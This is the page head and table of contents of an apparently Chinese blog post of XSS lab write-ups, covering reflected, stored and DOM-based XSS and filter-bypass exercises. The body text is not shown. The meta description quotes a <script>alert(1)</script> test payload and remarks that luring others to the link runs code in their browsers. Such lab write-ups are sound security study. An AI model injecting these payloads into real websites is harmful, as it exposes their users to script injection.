<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="反射型XSS实验要求：该实验室包含搜索功能中的一个简单的反映型跨站点脚本漏洞。 为了解决实验问题，执行调用该函数的跨站点脚本攻击alert。 实验过程：当我们在搜索框输入123：   服务器会回显我们输入的内容。 如果我们输入：&lt;script&gt;alert(1)&lt;&#x2F;script&gt;   做到这里，实验就完成了。  如果我们诱导其他人访问这个链接，我们的恶意代码就会在别人的浏览器">
<meta property="og:type" content="article">
<meta property="og:title" content="XSS">
<meta property="og:url" content="https://21346asz.github.io/XSS/XSS/index.html">
<meta property="og:site_name" content="wArn&#39;s blog">
<meta property="og:description" content="反射型XSS实验要求：该实验室包含搜索功能中的一个简单的反映型跨站点脚本漏洞。 为了解决实验问题，执行调用该函数的跨站点脚本攻击alert。 实验过程：当我们在搜索框输入123：   服务器会回显我们输入的内容。 如果我们输入：&lt;script&gt;alert(1)&lt;&#x2F;script&gt;   做到这里，实验就完成了。  如果我们诱导其他人访问这个链接，我们的恶意代码就会在别人的浏览器">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250725110101686.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250725110228311.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250726225005681.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250727091021107.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250727091921196.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250727094459612.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250727094649167.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250727102626335.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250727105438480.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250727105608795.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250727110104657.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250727114012736.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250727114159206.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250727114615500.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250727114711283.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250728090148823.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250728090350901.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250728091507536.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250728091718036.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250728092825188.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250728093827800.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250728093937822.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250728114042113.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250728114151058.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250728114641923.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250729092941883.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250729093020885.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250729094620108.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250729095151425.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250729095350905.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250729095414229.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250729135925123.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250729141738758.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250729141829147.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250729143741564.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250729143716823.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250729143915705.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250729144419379.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250730100152059.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250730095938675.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250730100257643.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250730100526491.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250730100628951.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250730100912245.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250730101221902.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250730115204233.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250730115837685.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250731090453332.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250731092804292.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250731102123243.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250731103646914.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250731104732602.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250801074313257.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250801074420347.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250801074607452.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250801074806515.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250801084327721.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250801084424834.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250801084631959.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250801084658212.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250801092110797.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250801110647246.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250801110921426.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250801111047236.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250801111431368.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250803070557236.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250803071828986.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250803083542794.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250803083732532.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250803084017742.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250803104313576.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250804085959952.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250804090651023.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250804094247364.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250804111810363.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250804104719173.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250804105127774.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250805100528638.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250805130348752.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250805130905957.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250806105416632.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250806105610445.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250806105756110.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250806112900225.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250806112911026.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250806113328551.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250807111844979.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250807111915567.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250807112050292.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250807114208245.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250807113142934.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250807113236814.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250807113608416.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250808091333118.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250808091939183.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250808092017665.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250808092154427.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250808092434309.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250808092837038.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250724073356812.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250724073528487.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250724073818519.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250724085458920.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250724111520821.png">
<meta property="og:image" content="https://21346asz.github.io/XSS/XSS/image-20250724112537643.png">
<meta property="article:published_time" content="2025-07-23T23:32:01.000Z">
<meta property="article:modified_time" content="2025-08-08T01:39:03.539Z">
<meta property="article:author" content="wArn">
<meta property="article:tag" content="XSS">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://21346asz.github.io/XSS/XSS/image-20250725110101686.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>XSS</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
    <!-- Waline Comments -->
  
    <link rel="stylesheet" href="https://unpkg.com/@waline/client@v3/dist/waline.css"/>
  
<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/categories/">categories</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/CTFwp/XYCTF-2025/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/CTFwp/BJDCTF-2020/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://21346asz.github.io/XSS/XSS/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://21346asz.github.io/XSS/XSS/&text=XSS"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://21346asz.github.io/XSS/XSS/&title=XSS"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://21346asz.github.io/XSS/XSS/&is_video=false&description=XSS"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=XSS&body=Check out this article: https://21346asz.github.io/XSS/XSS/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://21346asz.github.io/XSS/XSS/&title=XSS"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://21346asz.github.io/XSS/XSS/&title=XSS"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://21346asz.github.io/XSS/XSS/&title=XSS"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://21346asz.github.io/XSS/XSS/&title=XSS"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://21346asz.github.io/XSS/XSS/&name=XSS&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://21346asz.github.io/XSS/XSS/&t=XSS"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8BXSS"><span class="toc-number">1.</span> <span class="toc-text">反射型XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">实验要求：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">实验过程：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8BXSS"><span class="toc-number">2.</span> <span class="toc-text">存储型XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82%EF%BC%9A-1"><span class="toc-number">2.1.</span> <span class="toc-text">实验要求：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B%EF%BC%9A-1"><span class="toc-number">2.2.</span> <span class="toc-text">实验过程：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DOM-XSS"><span class="toc-number">3.</span> <span class="toc-text">DOM XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8Edocument-write%E6%8E%A5%E6%94%B6%E5%99%A8%E7%9A%84DOM-XSS%E6%94%BB%E5%87%BB%EF%BC%8C%E4%BD%BF%E7%94%A8location-search%E4%BD%9C%E4%B8%BA%E6%94%BB%E5%87%BB%E6%BA%90"><span class="toc-number">3.1.</span> <span class="toc-text">基于document.write接收器的DOM XSS攻击，使用location.search作为攻击源</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82%EF%BC%9A-2"><span class="toc-number">3.1.1.</span> <span class="toc-text">实验要求：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B%EF%BC%9A-2"><span class="toc-number">3.1.2.</span> <span class="toc-text">实验过程：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8Edocument-write%E6%8E%A5%E6%94%B6%E5%99%A8%E7%9A%84DOM-XSS-%E6%94%BB%E5%87%BB%EF%BC%8C%E5%9C%A8select%E5%85%83%E7%B4%A0%E5%86%85%E5%88%A9%E7%94%A8location-search%E4%BD%9C%E4%B8%BA%E6%94%BB%E5%87%BB%E6%BA%90"><span class="toc-number">3.2.</span> <span class="toc-text">基于document.write接收器的DOM XSS 攻击，在select元素内利用location.search作为攻击源</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82%EF%BC%9A-3"><span class="toc-number">3.2.1.</span> <span class="toc-text">实验要求：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B%EF%BC%9A-3"><span class="toc-number">3.2.2.</span> <span class="toc-text">实验过程：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8Elocation-search%E6%BA%90%E9%80%9A%E8%BF%87innerHTML%E6%8E%A5%E6%94%B6%E5%99%A8%E8%A7%A6%E5%8F%91%E7%9A%84DOM%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.3.</span> <span class="toc-text">基于location.search源通过innerHTML接收器触发的DOM型XSS漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82"><span class="toc-number">3.3.1.</span> <span class="toc-text">实验要求:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B%EF%BC%9A-4"><span class="toc-number">3.3.2.</span> <span class="toc-text">实验过程：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8location-search%E6%94%BB%E5%87%BBjQuery%E7%9A%84a%E6%A0%87%E7%AD%BEhref%E5%B1%9E%E6%80%A7%E5%AF%BC%E8%87%B4%E7%9A%84DOM%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.4.</span> <span class="toc-text">利用location.search攻击jQuery的a标签href属性导致的DOM型XSS漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82%EF%BC%9A-4"><span class="toc-number">3.4.1.</span> <span class="toc-text">实验要求：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B%EF%BC%9A-5"><span class="toc-number">3.4.2.</span> <span class="toc-text">实验过程：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-hashchange-%E4%BA%8B%E4%BB%B6%E5%9C%A8-jQuery-%E9%80%89%E6%8B%A9%E5%99%A8%E6%8E%A5%E6%94%B6%E5%99%A8%E4%B8%AD%E8%A7%A6%E5%8F%91%E7%9A%84-DOM-XSS-%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.5.</span> <span class="toc-text">利用 hashchange 事件在 jQuery 选择器接收器中触发的 DOM XSS 漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82%EF%BC%9A-5"><span class="toc-number">3.5.1.</span> <span class="toc-text">实验要求：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B%EF%BC%9A-6"><span class="toc-number">3.5.2.</span> <span class="toc-text">实验过程：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AngularJS%E8%A1%A8%E8%BE%BE%E5%BC%8F%E4%B8%AD%E5%AD%98%E5%9C%A8DOM%E5%9E%8B%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%EF%BC%88XSS%EF%BC%89%E6%BC%8F%E6%B4%9E%EF%BC%8C%E4%B8%94%E5%B0%96%E6%8B%AC%E5%8F%B7%E5%92%8C%E5%8F%8C%E5%BC%95%E5%8F%B7%E8%A2%ABHTML%E7%BC%96%E7%A0%81"><span class="toc-number">3.6.</span> <span class="toc-text">AngularJS表达式中存在DOM型跨站脚本（XSS）漏洞，且尖括号和双引号被HTML编码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82%EF%BC%9A-6"><span class="toc-number">3.6.1.</span> <span class="toc-text">实验要求：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B"><span class="toc-number">3.6.2.</span> <span class="toc-text">实验过程:</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8B-DOM-XSS%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.7.</span> <span class="toc-text">反射型 DOM XSS漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82%EF%BC%9A-7"><span class="toc-number">3.7.1.</span> <span class="toc-text">实验要求：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B%EF%BC%9A-7"><span class="toc-number">3.7.2.</span> <span class="toc-text">实验过程：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8B-DOM-XSS%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.8.</span> <span class="toc-text">存储型 DOM XSS漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82%EF%BC%9A-8"><span class="toc-number">3.8.1.</span> <span class="toc-text">实验要求：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B%EF%BC%9A-8"><span class="toc-number">3.8.2.</span> <span class="toc-text">实验过程：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bypass"><span class="toc-number">4.</span> <span class="toc-text">Bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HTML%E6%A0%87%E7%AD%BE%E4%B9%8B%E9%97%B4%E7%9A%84XSS%E6%94%BB%E5%87%BB"><span class="toc-number">4.1.</span> <span class="toc-text">HTML标签之间的XSS攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A4%A7%E5%A4%9A%E6%95%B0%E6%A0%87%E7%AD%BE%E5%92%8C%E5%B1%9E%E6%80%A7%E8%A2%AB%E7%A6%81%E6%AD%A2%E7%9A%84%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E6%94%BB%E5%87%BB"><span class="toc-number">4.1.1.</span> <span class="toc-text">大多数标签和属性被禁止的反射型XSS攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82-1"><span class="toc-number">4.1.1.1.</span> <span class="toc-text">实验要求</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B-1"><span class="toc-number">4.1.1.2.</span> <span class="toc-text">实验过程</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A6%81%E6%AD%A2%E4%BA%86%E6%89%80%E6%9C%89%E9%99%A4%E8%87%AA%E5%88%B6%E6%A0%87%E7%AD%BE%E4%BB%A5%E5%A4%96%E7%9A%84%E6%89%80%E6%9C%89%E6%A0%87%E7%AD%BE%E7%9A%84XSS%E6%94%BB%E5%87%BB"><span class="toc-number">4.1.2.</span> <span class="toc-text">禁止了所有除自制标签以外的所有标签的XSS攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82-2"><span class="toc-number">4.1.2.1.</span> <span class="toc-text">实验要求</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B-2"><span class="toc-number">4.1.2.2.</span> <span class="toc-text">实验过程</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%80%E6%9C%89%E4%BA%8B%E4%BB%B6%E5%92%8C-href-%E5%B1%9E%E6%80%A7%E5%9D%87%E8%A2%AB%E9%98%BB%E6%AD%A2%E7%9A%84%E5%8F%8D%E5%B0%84%E5%9E%8B-XSS"><span class="toc-number">4.1.3.</span> <span class="toc-text">所有事件和 href 属性均被阻止的反射型 XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82-3"><span class="toc-number">4.1.3.1.</span> <span class="toc-text">实验要求</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B-3"><span class="toc-number">4.1.3.2.</span> <span class="toc-text">实验过程</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%81%E8%AE%B8%E9%83%A8%E5%88%86SVG%E6%A0%87%E8%AE%B0%E7%9A%84%E5%8F%8D%E5%B0%84%E5%9E%8BXSS"><span class="toc-number">4.1.4.</span> <span class="toc-text">允许部分SVG标记的反射型XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82-4"><span class="toc-number">4.1.4.1.</span> <span class="toc-text">实验要求</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B-4"><span class="toc-number">4.1.4.2.</span> <span class="toc-text">实验过程</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTML%E6%A0%87%E7%AD%BE%E5%B1%9E%E6%80%A7%E4%B8%AD%E7%9A%84XSS%E6%94%BB%E5%87%BB"><span class="toc-number">4.2.</span> <span class="toc-text">HTML标签属性中的XSS攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E2%80%94%E2%80%94%E6%B3%A8%E5%85%A5HTML%E6%A0%87%E7%AD%BE%E5%B1%9E%E6%80%A7%EF%BC%88%E5%B0%96%E6%8B%AC%E5%8F%B7%E8%A2%ABHTML%E7%BC%96%E7%A0%81%E7%9A%84%E6%83%85%E5%86%B5%EF%BC%89"><span class="toc-number">4.2.1.</span> <span class="toc-text">反射型XSS——注入HTML标签属性（尖括号被HTML编码的情况）</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82-5"><span class="toc-number">4.2.1.1.</span> <span class="toc-text">实验要求</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B-5"><span class="toc-number">4.2.1.2.</span> <span class="toc-text">实验过程</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8BXSS%E2%80%94%E2%80%94%E5%88%A9%E7%94%A8%E9%94%9A%E7%82%B9href%E5%B1%9E%E6%80%A7%E6%B3%A8%E5%85%A5%EF%BC%88%E5%8F%8C%E5%BC%95%E5%8F%B7%E8%A2%ABHTML%E7%BC%96%E7%A0%81%EF%BC%89"><span 